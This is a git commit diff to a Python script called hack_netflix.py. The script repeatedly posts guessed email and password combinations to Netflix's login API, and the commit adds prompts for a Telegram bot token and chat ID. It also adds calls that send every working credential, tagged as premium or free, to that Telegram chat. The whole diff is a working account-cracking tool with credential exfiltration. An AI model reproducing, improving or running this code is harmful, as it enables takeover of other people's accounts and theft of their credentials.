4f219e088200264a3fa6fa42d6d9deab6ec0cd32
mahdyababneh282 <67274938+mahdyababneh282@users.noreply.github.com>
2022-03-04 00:02:42 +0300

    Update hack_netflix.py

--- hack_netflix.py
+++ hack_netflix.py
@@ -3,8 +3,13 @@ from user_agent import generate_user_agent
 E = '\033[1;31m'
 G = '\033[1;32m'
 S = '\033[1;33m'
-r=requests.Session()
-n_n=int(input('SLEEP TIME:'))
+Print=(E+'HACK ACCOUNT NETFLIX'+G+'\nBY : @TFT_MAHDY'+S+'\nCH:@AR_PROGRAMMERS'+G+'\n~~~~~~~~~~~~~~~~~~~~~~~~~')
+print(Print)
+token=input(S+'TOKEN:')
+ID=input(S+'ID:')
+os.system('clear')
+print(Print)
+n_n=int(input(G+'SLEEP TIME:'))
 os.system('clear')
 while True:
   a=['sara','lina','lian','Amina','Asma','Rana','Laila','Fatima','Maryam','Amal','Amani','Amira','Arwa','aya','Basma','Bayan','Bushra','Dalal','Dalia','Dana','Dania','Dina','ahmed','ahmad','rami','mahdy','mahdi','malek','mayas','mohammed']
@@ -40,14 +45,17 @@ while True:
     "Connection": "close"}
   time.sleep(n_n)
   data = f'appInternalVersion=10.19.0&appVersion=10.19.0&callPath=%5B%22moneyball%22%2C%22appleSignUp%22%2C%22next%22%5D&config=%7B%22useSecureImages%22%3Atrue%2C%22volatileBillboardEnabled%22%3A%22false%22%2C%22kidsTrailers%22%3Atrue%2C%22kidsBillboardEnabled%22%3A%22true%22%2C%22interactiveFeaturePIBEnabled%22%3A%22true%22%2C%22showMoreDirectors%22%3Atrue%2C%22roarEnabled%22%3A%22true%22%2C%22warmerHasGenres%22%3Atrue%2C%22aroGalleriesEnabled%22%3A%22false%22%2C%22verticalBillboardEnabled%22%3A%22true%22%2C%22previewsRowEnabled%22%3A%22true%22%2C%22contentRefreshEnabled%22%3A%22false%22%2C%22interactiveFeatureStretchBreakoutEnabled%22%3A%22true%22%2C%22interactiveFeatureBuddyEnabled%22%3A%22true%22%2C%22interactiveFeatureAlexaAndKatieCharacterEnabled%22%3A%229.57.0%22%2C%22titleCapabilityFlattenedShowEnabled%22%3A%22true%22%2C%22kidsMyListEnabled%22%3A%22true%22%2C%22billboardEnabled%22%3A%22true%22%2C%22interactiveFeatureBadgeIconTestEnabled%22%3A%229.57.0%22%2C%22shortformRowEnabled%22%3A%22false%22%2C%22kidsUIOnPhone%22%3Afalse%2C%22contentWarningEnabled%22%3A%22true%22%2C%22billboardPredictionEnabled%22%3A%22false%22%2C%22billboardKidsTrailerEnabled%22%3A%22false%22%2C%22billboardTrailerEnabled%22%3A%22false%22%2C%22bigRowEnabled%22%3A%22true%22%7D&device_type=NFAPPL-02-&esn=NFAPPL-02-IPHONE9%3D4-D5BA7B1A025245368D4AA323E987433C52C6FB4B673E85621EA301D444EC78B1&idiom=phone&iosVersion=14.3&isTablet=false&kids=false&maxDeviceWidth=414&method=call&model=saget&modelType=IPHONE9-4&odpAware=true&param=%7B%22action%22%3A%22loginAction%22%2C%22fields%22%3A%7B%22email%22%3A%22{email}%40{domn}%22%2C%22rememberMe%22%3A%22true%22%2C%22password%22%3A%22{password}%22%7D%2C%22verb%22%3A%22POST%22%2C%22mode%22%3A%22login%22%2C%22flow%22%3A%22appleSignUp%22%7D&pathFormat=graph&pixelDensity=3.0&progressive=false&responseFormat=json'
+  r=requests.Session()
   Go = r.post(url, headers=headers, data=data, proxies=None)
   if '"memberHome"' in Go.text:
   	print(f'{G}[√] تم صيد==> {ema} | {password}')
+  	tlg =requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=NEW PREMIUM ACCOUNT NETFLIX\n EMAIL : {ema}\nPASSWORD : {password}\nBY: @TFT_MAHDY | CH : @AR_PROGRAMMERS''')
   elif '"incorrect_password"' in Go.text:
   	print(f'{E}[×] كلمة السر خاطئة==> {ema} | {password}')
   elif 'never_member_consumption_only' in Go.text:
   	print(f'{S}[≠] تم صيد نيتفلكس مجاني==> {ema} | {password}')
+  	tlg =requests.post(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=NEW FREE ACCOUNT NETFLIX\n EMAIL : {ema}\nPASSWORD : {password}\nBY: @TFT_MAHDY | CH : @AR_PROGRAMMERS''')
   elif 'unrecognized_email' in Go.text:
-      print(f'{E}[×] الايميل خاطئ ==> {ema} | {password}')
+      print(f'{E}[×] الايميل خطأ==> {ema} | {password}')
   else:
   	print(f'{E}[∞] تم حظرك انتظر قليلا او اكثر من sleep')
